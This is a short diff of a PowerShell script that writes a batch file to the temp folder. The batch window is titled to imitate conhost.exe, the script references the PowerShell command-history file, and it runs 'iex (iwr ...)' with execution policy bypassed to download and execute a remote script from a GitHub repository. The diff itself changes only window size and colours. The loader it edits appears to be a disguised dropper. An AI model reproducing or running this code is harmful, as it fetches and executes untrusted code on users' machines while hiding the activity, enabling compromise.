@@ -2,9 +2,9 @@ $path = "$env:TEMP\run.bat"
 
 @"
 @echo off
-mode con: cols=50 lines=15
+mode con: cols=30 lines=15
 title C:\Windows\System32\conhost.exe
-color 0A
+color 07
 cls
 
 set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -34,7 +34,7 @@ goto input
 powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
 
 cls
-color 07
+color 0A
 echo Successfully
 timeout /t 2 >nul
 exit
